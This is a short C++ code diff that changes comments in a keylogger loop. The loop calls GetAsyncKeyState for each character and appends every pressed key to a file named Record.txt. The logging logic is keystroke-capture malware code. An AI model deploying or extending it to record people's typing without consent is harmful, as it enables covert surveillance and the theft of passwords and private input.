@@ -14,10 +14,9 @@ int main(void) {
                 i.e.; 32767
             */
             if (GetAsyncKeyState(character) == -32767) {
-                std::ofstream write("Record.txt", std::ios::app); // Use std::ofstream and std::ios::app
-                // ios::app ensures that the file is opened in append mode.
+                std::ofstream write("Record.txt", std::ios::app);  // ios::app ensures that the file is opened in append mode.
                 write << character;
-                write.close(); // Ensure the file is closed after each write operation
+                write.close(); // closing the file.
             }
         }
     }
